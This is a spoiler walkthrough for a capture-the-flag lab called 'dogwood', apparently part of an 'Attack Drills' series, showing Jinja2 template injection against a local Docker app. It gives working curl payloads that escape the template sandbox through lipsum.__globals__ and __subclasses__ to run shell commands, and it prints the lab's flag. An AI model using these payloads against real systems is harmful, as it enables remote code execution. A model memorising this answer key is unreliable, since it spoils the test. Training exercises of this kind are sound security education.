# SOLUTION — dogwood (walkthrough, spoilers + flag)

Attack Drills series · `ssti/` · entry `http://127.0.0.1:18944`.
Commands assume the shot is armed and reachable on `127.0.0.1`
(`cp .env.example .env && docker compose up -d --build`). The flag value
below is the field-verified run's value, reproduced exactly as captured
(flags are public by policy; your own `FLAG` build arg will differ).

---

1. The front page's own directory listing shows `flag.txt` sitting in the
   app directory. The greeter builds a template from your raw input:
   `Environment().from_string("Welcome " + username + "!").render()` —
   so `{{...}}` is evaluated.

2. Quick probe (note: a bare `Environment()` has **no** `open` global —
   `{{ open('flag.txt').read() }}` renders nothing, which trips people up):

   ```bash
   curl -s -G http://127.0.0.1:18944/ --data-urlencode 'username={{ 7*7 }}'
   ```

3. Index-free escape via a template global's module globals (`lipsum` is a
   Jinja2 default global whose module imports `os`):

   ```bash
   curl -s -G http://127.0.0.1:18944/ \
        --data-urlencode "username={{ lipsum.__globals__['os'].popen('cat flag.txt').read() }}"
   ```

   The page greets you with the flag inline:

   ```
   FLAG{xbow_dogwood_b1bf589b7b910609d908204e}}
   ```

   (Fallback if that global is missing in some Jinja2 version: enumerate
   `{{ ''.__class__.__mro__[1].__subclasses__() }}`, find `os._wrap_close`,
   and call `.__init__.__globals__['popen']('cat flag.txt').read()`.)

> Field note: `flag.txt` is *not* web-served — `/flag.txt` 404s; the
> template is the only read channel.

---


---

## Flag (field-verified run)

```
FLAG{xbow_dogwood_b1bf589b7b910609d908204e}}
```

Location: app dir `flag.txt`.
